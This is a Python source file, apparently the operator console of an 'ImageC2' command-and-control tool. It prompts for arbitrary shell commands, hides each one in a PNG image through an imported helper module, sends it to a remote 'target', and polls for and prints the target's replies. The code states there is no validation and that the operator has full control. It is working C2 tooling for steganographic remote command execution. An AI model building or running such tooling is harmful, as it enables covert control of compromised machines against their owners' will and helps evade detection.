import os
import signal
from time import sleep
from imagec2_common import ImageC2_Common
from pathlib import Path


def signal_handler(sig, frame):
    print('Ctrl+C caught. Clean up and exit...')
    exit(0)


def init(download_location:str):
    # Create the download directory if it doesn't exist
    os.makedirs(download_location, exist_ok=True)
    # And register the signal handler
    signal.signal(signal.SIGINT, signal_handler)


def start(command_image_file_path:str, ic2:ImageC2_Common, sleep_time:int=5)->None:
    # REPL 
    while True:
        command = input("This is me prompting for a command> ")
        if command == "exit" or command == "quit" or command == "q":
            break
        elif command == "":
            continue
        elif command == "help" or command == "h":
            print("Commands: \n\texit, quit, q: Exit the program\n\thelp, h: Show this help message.")
            continue
        # No validation at this time, the operator has full control:
        print("Waiting for the target to respond...")
        ic2.send_hidden_command(command, command_image_file_path)
        # Then check for a response from the target:
        while True:
            new_messages = ic2.get_new_messages()
            if [] != new_messages and new_messages is not None:
                for message in new_messages:
                    print(message)
                break # Go back to get a new command.
            # Wait a bit before checking for new messages again
            sleep(sleep_time)


if __name__ == '__main__':
    image_folder_path = Path(r"G:\repos\ImageC2\endpoint_controller\images" )
    image_file_name = "command.png"
    command_image_file_path = image_folder_path / image_file_name
    imagec2_url = "http://localhost:5000"
    
    init(image_folder_path)
    ic2 = ImageC2_Common(imagec2_url, image_folder_path, base_file_name="command")
    ic2.update_existing_urls()
    start(command_image_file_path, ic2, sleep_time=5)
